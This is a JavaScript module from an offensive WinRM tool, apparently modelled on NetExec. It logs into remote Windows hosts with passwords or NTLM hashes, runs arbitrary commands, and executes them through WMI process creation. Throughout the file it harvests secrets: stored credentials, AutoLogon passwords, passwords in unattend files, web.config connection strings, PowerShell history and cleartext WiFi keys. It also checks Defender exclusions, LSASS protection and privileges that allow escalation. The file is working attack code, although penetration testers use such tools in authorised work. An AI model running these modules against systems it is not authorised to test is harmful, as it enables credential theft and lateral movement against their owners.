import { WinRMClient } from '../winrm/client.js';
import { Shell } from '../winrm/shell.js';
import { download, upload } from '../winrm/transfer.js';

function winrmPort(tls) { return tls ? 5986 : 5985; }

// Open a WinRM connection + PowerShell shell, run `fn(shell)`, close cleanly.
// The Shell class wraps cmd exec + streaming output; every module in this file
// runs through it.
async function withShell(host, creds, opts, fn) {
  const client = new WinRMClient(() => {});
  await client.connect(host, winrmPort(opts.tls), {
    user: creds.user, domain: creds.domain, password: creds.password,
    hash: creds.hash, tls: !!opts.tls, sni: host, authMethod: opts.auth || 'ntlm',
    kdc: opts.kdc, spn: opts.spn,
  });
  const shell = new Shell(client, () => {});
  await shell.open();
  try {
    return await fn(shell, client);
  } finally {
    try { await shell.close(); } catch {}
    try { await client.close(); } catch {}
  }
}

// Run an arbitrary command through the shell and log stdout/stderr line-by-
// line. Returns the { stdout, stderr, exitCode } from Shell.run.
async function runAndLog(shell, host, log, command) {
  const result = await shell.run(command);
  for (const line of (result.stdout || '').split(/\r?\n/)) {
    if (line.length) log('ok', 'winrm', host, '', line.trimEnd());
  }
  for (const line of (result.stderr || '').split(/\r?\n/)) {
    if (line.length) log('err', 'winrm', host, '', line.trimEnd());
  }
  return result;
}

export async function winrmAuth(host, creds, opts, log) {
  try {
    await withShell(host, creds, opts, async () => { /* opened + closed */ });
    log('ok', 'winrm', host, `${creds.domain}\\${creds.user} (Pwn3d!)`, 'shell opened');
    return true;
  } catch (e) {
    log('err', 'winrm', host, `${creds.domain}\\${creds.user}`, e.message);
    return false;
  }
}

export async function winrmExec(host, creds, opts, log, command) {
  if (!command) { log('err', 'winrm', host, 'exec', 'no command specified'); return null; }
  try {
    return await withShell(host, creds, opts, (shell) => runAndLog(shell, host, log, command));
  } catch (e) {
    log('err', 'winrm', host, 'exec', e.message);
    return null;
  }
}

// Shell.run already wraps every command in powershell.exe with the tracked
// CWD and preamble, so --ps is just --exec at this layer. Kept as a distinct
// module for muscle-memory / help clarity.
export async function winrmPs(host, creds, opts, log, command) {
  if (!command) { log('err', 'winrm', host, 'ps', 'no command specified'); return null; }
  return winrmExec(host, creds, opts, log, command);
}

export async function winrmSam(host, creds, opts, log) {
  return winrmPs(host, creds, opts, log,
    'Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet | Format-Table -AutoSize | Out-String -Width 300');
}

export async function winrmLsa(host, creds, opts, log) {
  return winrmPs(host, creds, opts, log,
    'Get-LocalGroup | ForEach-Object { $g=$_.Name; $m=(Get-LocalGroupMember $g -ErrorAction SilentlyContinue | Select -Exp Name) -join ","; "$g`: $m" }');
}

export async function winrmSysinfo(host, creds, opts, log) {
  return winrmExec(host, creds, opts, log, 'systeminfo');
}

export async function winrmIpconfig(host, creds, opts, log) {
  return winrmExec(host, creds, opts, log, 'ipconfig /all');
}

export async function winrmWhoami(host, creds, opts, log) {
  return winrmExec(host, creds, opts, log, 'whoami /all');
}

export async function winrmProcs(host, creds, opts, log) {
  return winrmExec(host, creds, opts, log, 'tasklist /V');
}

export async function winrmServices(host, creds, opts, log) {
  return winrmPs(host, creds, opts, log,
    'Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name,DisplayName | Format-Table -AutoSize | Out-String -Width 300');
}

export async function winrmNetstat(host, creds, opts, log) {
  return winrmExec(host, creds, opts, log, 'netstat -ano');
}

export async function winrmAv(host, creds, opts, log) {
  return winrmPs(host, creds, opts, log,
    'Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated | Format-List');
}

export async function winrmGet(host, creds, opts, log, remotePath) {
  if (!remotePath) { log('err', 'winrm', host, 'get', 'no remote path specified'); return null; }
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const data = await download(shell, remotePath);
      log('ok', 'winrm', host, remotePath, `${data.length} bytes downloaded`);
      return data;
    });
  } catch (e) {
    log('err', 'winrm', host, 'get', e.message);
    return null;
  }
}

export async function winrmPut(host, creds, opts, log, args) {
  if (!args) { log('err', 'winrm', host, 'put', 'usage: <remote_path> <content>'); return null; }
  const spaceIdx = args.indexOf(' ');
  const remotePath = spaceIdx > 0 ? args.slice(0, spaceIdx) : args;
  const content = spaceIdx > 0 ? args.slice(spaceIdx + 1) : '';
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const bytes = new TextEncoder().encode(content);
      await upload(shell, remotePath, bytes);
      log('ok', 'winrm', host, remotePath, `${bytes.length} bytes uploaded`);
      return true;
    });
  } catch (e) {
    log('err', 'winrm', host, 'put', e.message);
    return null;
  }
}

export async function winrmRegQuery(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'winrm', host, 'reg-query', 'usage: --reg-query "HKLM\\SOFTWARE\\..."');
    return null;
  }
  try {
    return await withShell(host, creds, opts, (shell) => runAndLog(shell, host, log, `reg query "${args.trim()}" 2>&1`));
  } catch (e) {
    log('err', 'winrm', host, 'reg-query', e.message);
    return null;
  }
}

export async function winrmEnv(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const r = await shell.run('set');
      for (const line of (r.stdout || '').split(/\r?\n/)) if (line.length) log('ok', 'winrm', host, '', line.trimEnd());
      return r.stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'env', e.message);
    return null;
  }
}

export async function winrmUsers(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const r = await shell.run('net user');
      for (const line of (r.stdout || '').split(/\r?\n/)) if (line.length) log('ok', 'winrm', host, '', line.trimEnd());
      return r.stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'users', e.message);
    return null;
  }
}

export async function winrmShares(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const r = await shell.run('net share');
      for (const line of (r.stdout || '').split(/\r?\n/)) if (line.length) log('ok', 'winrm', host, '', line.trimEnd());
      return r.stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'shares', e.message);
    return null;
  }
}

export async function winrmDisk(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('wmic logicaldisk get Caption,Size,FreeSpace,DriveType /format:list');
      for (const line of (stdout || '').split('\n').filter(l => l.trim())) {
        log('ok', 'winrm', host, '', line.trimEnd());
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'disk', e.message);
    return null;
  }
}

export async function winrmSoftware(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('wmic product get Name,Version /format:csv');
      const lines = (stdout || '').split('\n').filter(l => l.trim() && !l.startsWith('Node'));
      for (const line of lines) {
        const parts = line.split(',');
        if (parts.length >= 3) {
          log('ok', 'winrm', host, parts[1]?.trim() || '', parts[2]?.trim() || '');
        }
      }
      log('ok', 'winrm', host, 'software', `${lines.length} product(s) installed`);
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'software', e.message);
    return null;
  }
}

export async function winrmTasks(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('schtasks /query /fo LIST /v');
      const tasks = (stdout || '').split('\n');
      let current = '';
      let count = 0;
      for (const line of tasks) {
        const l = line.trim();
        if (l.startsWith('TaskName:')) {
          current = l.replace('TaskName:', '').trim();
        }
        if (l.startsWith('Task To Run:') && current && !current.startsWith('\\Microsoft\\')) {
          const cmd = l.replace('Task To Run:', '').trim();
          log('ok', 'winrm', host, current, cmd);
          count++;
          current = '';
        }
      }
      log('ok', 'winrm', host, 'tasks', `${count} non-Microsoft scheduled task(s)`);
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'tasks', e.message);
    return null;
  }
}

export async function winrmFirewall(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('netsh advfirewall show allprofiles state');
      for (const line of (stdout || '').split('\n').filter(l => l.trim())) {
        log('ok', 'winrm', host, '', line.trimEnd());
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'firewall', e.message);
    return null;
  }
}

export async function winrmDomainInfo(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const cmds = [
        'systeminfo | findstr /i "domain"',
        'nltest /dclist: 2>nul',
        'nltest /domain_trusts 2>nul',
      ];
      for (const cmd of cmds) {
        const { stdout } = await shell.run(cmd);
        if (stdout?.trim()) {
          for (const line of stdout.split('\n').filter(l => l.trim())) {
            log('ok', 'winrm', host, '', line.trimEnd());
          }
        }
      }
      return true;
    });
  } catch (e) {
    log('err', 'winrm', host, 'domain-info', e.message);
    return null;
  }
}

export async function winrmEvents(host, creds, opts, log, args) {
  const eventId = args?.trim() || '4624';
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const cmd = `wevtutil qe Security "/q:*[System[(EventID=${eventId})]]" /c:20 /f:text /rd:true`;
      const { stdout } = await shell.run(cmd);
      const lines = (stdout || '').split('\n').filter(l => l.trim());
      if (!lines.length) {
        log('info', 'winrm', host, 'events', `no events with ID ${eventId} found`);
      } else {
        for (const line of lines) {
          log('ok', 'winrm', host, '', line.trimEnd());
        }
        log('ok', 'winrm', host, 'events', `${lines.length} line(s) from event ID ${eventId}`);
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'events', e.message);
    return null;
  }
}

export async function winrmPrivs(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('whoami /priv');
      for (const line of (stdout || '').split('\n').filter(l => l.trim())) {
        log('ok', 'winrm', host, '', line.trimEnd());
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'privs', e.message);
    return null;
  }
}

export async function winrmPatches(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('wmic qfe get Caption,Description,HotFixID,InstalledOn /format:csv');
      const lines = (stdout || '').split('\n').filter(l => l.trim() && !l.startsWith('Node'));
      let count = 0;
      for (const line of lines) {
        const parts = line.split(',');
        if (parts.length >= 5) {
          log('ok', 'winrm', host, parts[3]?.trim() || '', `${parts[2]?.trim() || ''} (${parts[4]?.trim() || ''})`);
          count++;
        }
      }
      log('ok', 'winrm', host, 'patches', `${count} hotfix(es) installed`);
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'patches', e.message);
    return null;
  }
}

export async function winrmStartup(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | Format-List');
      for (const line of stdout.split('\n').filter(l => l.trim())) {
        log('ok', 'winrm', host, 'startup', line.trimEnd());
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'startup', e.message);
    return null;
  }
}

export async function winrmDrivers(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('Get-WmiObject Win32_PnPSignedDriver | Where-Object {$_.IsSigned -eq $false} | Select-Object DeviceName,DriverVersion,Manufacturer | Format-Table -AutoSize');
      if (!stdout.trim()) {
        log('info', 'winrm', host, 'drivers', 'no unsigned drivers found');
      } else {
        for (const line of stdout.split('\n').filter(l => l.trim())) {
          log('warn', 'winrm', host, 'driver', line.trimEnd());
        }
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'drivers', e.message);
    return null;
  }
}

export async function winrmAuditPol(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('auditpol /get /category:* 2>&1');
      for (const line of stdout.split('\n').filter(l => l.trim())) {
        if (line.includes('Success') || line.includes('Failure') || line.includes('No Auditing')) {
          const level = line.includes('No Auditing') ? 'warn' : 'ok';
          log(level, 'winrm', host, 'audit', line.trimEnd());
        }
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'audit', e.message);
    return null;
  }
}

export async function winrmDefender(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('Get-MpPreference | Select-Object DisableRealtimeMonitoring,DisableBehaviorMonitoring,DisableScriptScanning,ExclusionPath,ExclusionExtension,ExclusionProcess | Format-List');
      for (const line of stdout.split('\n').filter(l => l.trim())) {
        const isExcl = line.includes('Exclusion');
        log(isExcl ? 'warn' : 'ok', 'winrm', host, 'defender', line.trimEnd());
      }

      const { stdout: status } = await shell.run('Get-MpComputerStatus | Select-Object AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled | Format-List');
      for (const line of status.split('\n').filter(l => l.trim())) {
        const disabled = line.includes('False');
        log(disabled ? 'warn' : 'ok', 'winrm', host, 'defender', line.trimEnd());
      }

      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'defender', e.message);
    return null;
  }
}

export async function winrmLocalAdmins(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('net localgroup Administrators 2>&1');
      const lines = stdout.split('\n');
      let inMembers = false;
      for (const line of lines) {
        if (line.includes('---')) { inMembers = true; continue; }
        if (line.includes('The command completed')) { inMembers = false; continue; }
        if (inMembers && line.trim()) {
          log('ok', 'winrm', host, 'local-admin', line.trim());
        }
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'local-admins', e.message);
    return null;
  }
}

export async function winrmPipes(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('[System.IO.Directory]::GetFiles("\\\\.\\pipe\\") | ForEach-Object { $_.Replace("\\\\.\\pipe\\","")}');
      const pipes = stdout.split('\n').filter(l => l.trim());
      for (const p of pipes) {
        log('ok', 'winrm', host, 'pipe', p.trim());
      }
      log('ok', 'winrm', host, 'pipes', `${pipes.length} named pipe(s)`);
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'pipes', e.message);
    return null;
  }
}

export async function winrmAutorun(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const keys = [
        'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
        'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
      ];
      for (const key of keys) {
        const { stdout } = await shell.run(`reg query "${key}" 2>nul 2>&1`);
        if (stdout.trim()) {
          for (const line of stdout.split('\n').filter(l => l.trim() && !l.includes('HKEY_'))) {
            log('ok', 'winrm', host, key.split('\\').pop(), line.trim());
          }
        }
      }
      return true;
    });
  } catch (e) {
    log('err', 'winrm', host, 'autorun', e.message);
    return null;
  }
}

export async function winrmTokenPrivs(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('whoami /priv 2>&1');
      const interesting = ['SeDebugPrivilege', 'SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege',
        'SeBackupPrivilege', 'SeRestorePrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege',
        'SeTcbPrivilege', 'SeCreateTokenPrivilege'];
      for (const line of stdout.split('\n').filter(l => l.trim())) {
        const isHot = interesting.some(p => line.includes(p));
        if (isHot && line.includes('Enabled')) {
          log('warn', 'winrm', host, 'PRIVESC', line.trim());
        } else if (isHot) {
          log('ok', 'winrm', host, 'priv', line.trim());
        }
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'token-privs', e.message);
    return null;
  }
}

export async function winrmLsass(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run(
        'Get-Process lsass -ErrorAction SilentlyContinue | Select-Object Id, SessionId, HandleCount, WorkingSet64; ' +
        '$protection = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL; ' +
        'Write-Output "RunAsPPL: $protection"; ' +
        '$cg = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" -Name EnableVirtualizationBasedSecurity -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity; ' +
        'Write-Output "CredentialGuard: $cg"');
      for (const line of stdout.split('\n').filter(l => l.trim())) {
        const isProt = line.includes('RunAsPPL: 1') || line.includes('CredentialGuard: 1');
        log(isProt ? 'ok' : 'warn', 'winrm', host, 'lsass', line.trim());
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'lsass', e.message);
    return null;
  }
}

export async function winrmAppLocker(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout: svc } = await shell.run('sc query AppIDSvc 2>&1');
      if (svc.includes('RUNNING')) {
        log('ok', 'winrm', host, 'applocker', 'AppIDSvc is running');
      } else {
        log('warn', 'winrm', host, 'applocker', 'AppLocker service NOT running');
      }

      const { stdout } = await shell.run('Get-ChildItem "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2" -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "$($_.PSChildName): $((Get-ChildItem $_.PSPath).Count) rule(s)" }');
      if (stdout.trim()) {
        for (const line of stdout.split('\n').filter(l => l.trim())) {
          log('ok', 'winrm', host, 'applocker', line.trim());
        }
      } else {
        log('warn', 'winrm', host, 'applocker', 'no AppLocker rules configured');
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'applocker', e.message);
    return null;
  }
}

export async function winrmBitlocker(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('manage-bde -status 2>&1');
      if (stdout.trim() && !stdout.includes('not recognized')) {
        for (const line of stdout.split('\n').filter(l => l.trim())) {
          if (line.includes('Volume') || line.includes('Encryption') || line.includes('Protection') || line.includes('Lock')) {
            log('ok', 'winrm', host, 'bitlocker', line.trim());
          }
        }
      } else {
        log('info', 'winrm', host, 'bitlocker', 'BitLocker not available');
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'bitlocker', e.message);
    return null;
  }
}

export async function winrmCredVault(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('cmdkey /list 2>&1');
      const entries = stdout.split('\n').filter(l => l.includes('Target:') || l.includes('User:') || l.includes('Type:'));
      for (const line of entries) {
        log('ok', 'winrm', host, 'cred-vault', line.trim());
      }
      if (!entries.length) log('info', 'winrm', host, 'cred-vault', 'no stored credentials');
      else log('ok', 'winrm', host, 'cred-vault', `${Math.ceil(entries.length / 3)} credential(s)`);
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'cred-vault', e.message);
    return null;
  }
}

export async function winrmDotnet(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" /s 2>nul | findstr /i "version" 2>&1');
      for (const line of stdout.split('\n').filter(l => l.trim())) {
        log('ok', 'winrm', host, '.NET', line.trim());
      }

      const { stdout: ps } = await shell.run('$PSVersionTable | Format-List');
      for (const line of ps.split('\n').filter(l => l.trim() && l.includes(':'))) {
        log('ok', 'winrm', host, 'powershell', line.trim());
      }

      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'dotnet', e.message);
    return null;
  }
}

export async function winrmWmi(host, creds, opts, log, command) {
  if (!command) { log('err', 'winrm', host, 'wmi', 'no command specified (--wmi "command")'); return null; }
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const outFile = `C:\\Windows\\Temp\\nxc_${Date.now().toString(36)}.tmp`;
      const createPs = [
        `$r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList @("cmd.exe /c ${command.replace(/"/g, '`"')} > ${outFile} 2>&1")`,
        '$r.ProcessId',
        '$r.ReturnValue',
      ].join('; ');
      const { stdout: createOut } = await shell.run(createPs);
      const lines = (createOut || '').trim().split('\n').map(l => l.trim()).filter(Boolean);
      const pid = lines[0] || '?';
      const retVal = lines[1] || '?';
      if (retVal !== '0') {
        log('err', 'winrm', host, 'wmi', `Win32_Process.Create returned ${retVal} (pid ${pid})`);
          return null;
      }
      log('info', 'winrm', host, 'wmi', `process created pid=${pid}`);

      // Wait for process and read output
      const waitPs = `$p = Get-Process -Id ${pid} -ErrorAction SilentlyContinue; if($p){$p.WaitForExit(15000)}; Start-Sleep -Milliseconds 500; if(Test-Path '${outFile}'){Get-Content '${outFile}' -Raw; Remove-Item '${outFile}' -Force} else {'(no output)'}`;
      const { stdout, stderr } = await shell.run(waitPs);
      if (stdout) {
        for (const line of stdout.split('\n').filter(Boolean)) {
          log('ok', 'winrm', host, '', line.trimEnd());
        }
      }
      if (stderr) {
        for (const line of stderr.split('\n').filter(Boolean)) {
          log('err', 'winrm', host, '', line.trimEnd());
        }
      }
      return { stdout, stderr, pid, retVal };
    });
  } catch (e) {
    log('err', 'winrm', host, 'wmi', e.message);
    return null;
  }
}

export async function winrmWmiQuery(host, creds, opts, log, query) {
  if (!query) { log('err', 'winrm', host, 'wmi-query', 'no WQL query specified'); return null; }
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const ps = `Get-WmiObject -Query "${query.replace(/"/g, '`"')}" | Format-List | Out-String -Width 500`;
      const { stdout, stderr } = await shell.run(ps);
      if (stdout) {
        for (const line of stdout.split('\n').filter(l => l.trim())) {
          log('ok', 'winrm', host, '', line.trimEnd());
        }
      }
      if (stderr) {
        for (const line of stderr.split('\n').filter(Boolean)) {
          log('err', 'winrm', host, '', line.trimEnd());
        }
      }
      return { stdout, stderr };
    });
  } catch (e) {
    log('err', 'winrm', host, 'wmi-query', e.message);
    return null;
  }
}

export async function winrmSecrets(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {

      // Stored credentials
      const { stdout: cmdkey } = await shell.run('cmdkey /list 2>&1');
      const keyEntries = (cmdkey || '').split('\n').filter(l => l.includes('Target:') || l.includes('User:'));
      for (const line of keyEntries) {
        log('warn', 'winrm', host, 'secret', line.trim());
      }

      // Credential Manager via PowerShell (more detailed)
      const ps1 = [
        'Get-ChildItem "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -ErrorAction SilentlyContinue | ForEach-Object {',
        '  $def = (Get-ItemProperty $_.PSPath -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName',
        '  $pw = (Get-ItemProperty $_.PSPath -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword',
        '  if($def){Write-Output "AutoLogon: $def / $pw"}',
        '}',
      ].join('\n');
      const { stdout: auto } = await shell.run(ps1);
      if (auto?.trim()) {
        for (const line of auto.split('\n').filter(l => l.trim())) {
          log('warn', 'winrm', host, 'AUTOLOGON', line.trim());
        }
      }

      // Unattend.xml / sysprep files
      const paths = [
        'C:\\Windows\\Panther\\Unattend.xml',
        'C:\\Windows\\Panther\\unattend.xml',
        'C:\\Windows\\system32\\sysprep\\unattend.xml',
        'C:\\Windows\\system32\\sysprep\\sysprep.xml',
      ];
      for (const p of paths) {
        const { stdout: check } = await shell.run(`if exist "${p}" (findstr /i "password" "${p}" 2>nul) else (echo NOTFOUND) 2>&1`);
        if (check?.trim() && !check.includes('NOTFOUND')) {
          for (const line of check.split('\n').filter(l => l.trim())) {
            log('warn', 'winrm', host, p.split('\\').pop(), line.trim());
          }
        }
      }

      // IIS web.config connection strings
      const ps2 = `Get-ChildItem C:\\inetpub -Recurse -Filter web.config -ErrorAction SilentlyContinue | ForEach-Object { Select-String -Path $_.FullName -Pattern 'connectionString|password' -ErrorAction SilentlyContinue }`;
      const { stdout: iis } = await shell.run(ps2);
      if (iis?.trim()) {
        for (const line of iis.split('\n').filter(l => l.trim())) {
          log('warn', 'winrm', host, 'web.config', line.trim());
        }
      }

      return true;
    });
  } catch (e) {
    log('err', 'winrm', host, 'secrets', e.message);
    return null;
  }
}

export async function winrmUac(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run(
        'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>&1; ' +
        'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin 2>&1; ' +
        'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy 2>&1');
      for (const line of (stdout || '').split('\n').filter(l => l.trim() && !l.includes('HKEY_'))) {
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 3) {
          const name = parts[0];
          const val = parseInt(parts[2], 16);
          let status = '';
          if (name === 'EnableLUA') status = val ? 'enabled' : 'DISABLED';
          else if (name === 'ConsentPromptBehaviorAdmin') {
            const levels = { 0: 'no prompt (ELEVATE)', 1: 'creds on secure desktop', 2: 'consent on secure desktop', 3: 'creds prompt', 4: 'consent prompt', 5: 'consent (non-Win)' };
            status = levels[val] || `value ${val}`;
          }
          else if (name === 'LocalAccountTokenFilterPolicy') status = val ? 'DISABLED (full remote admin)' : 'enabled';
          log(val === 0 && name === 'EnableLUA' ? 'warn' : 'ok', 'winrm', host, 'UAC', `${name}: ${val} (${status})`);
        }
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'uac', e.message);
    return null;
  }
}

export async function winrmPowershellHistory(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const ps = [
        'Get-ChildItem "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | ForEach-Object {',
        '  $user = $_.FullName.Split("\\")[2]',
        '  Write-Output "=== $user ==="',
        '  Get-Content $_.FullName -Tail 30 -ErrorAction SilentlyContinue',
        '}',
      ].join('\n');
      const { stdout } = await shell.run(ps);
      if (stdout?.trim()) {
        for (const line of stdout.split('\n').filter(l => l.trim())) {
          const isHeader = line.startsWith('===');
          const hasCreds = /password|secret|key|token|cred/i.test(line);
          log(hasCreds ? 'warn' : isHeader ? 'ok' : 'info', 'winrm', host, 'ps-history', line.trimEnd());
        }
      } else {
        log('info', 'winrm', host, 'ps-history', 'no PowerShell history files found');
      }
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'ps-history', e.message);
    return null;
  }
}

export async function winrmWifi(host, creds, opts, log) {
  try {
    return await withShell(host, creds, opts, async (shell) => {
      const { stdout } = await shell.run('netsh wlan show profiles 2>&1');
      const profiles = stdout.split('\n').filter(l => l.includes('All User Profile'));
      for (const p of profiles) {
        const name = p.split(':').slice(1).join(':').trim();
        if (!name) continue;
        const { stdout: detail } = await shell.run(`netsh wlan show profile name="${name}" key=clear 2>&1`);
        const keyLine = detail.split('\n').find(l => l.includes('Key Content'));
        if (keyLine) {
          const key = keyLine.split(':').slice(1).join(':').trim();
          log('warn', 'winrm', host, name, `WiFi key: ${key}`);
        } else {
          log('ok', 'winrm', host, name, 'no key stored');
        }
      }
      if (!profiles.length) log('info', 'winrm', host, 'wifi', 'no WiFi profiles found');
      return stdout;
    });
  } catch (e) {
    log('err', 'winrm', host, 'wifi', e.message);
    return null;
  }
}
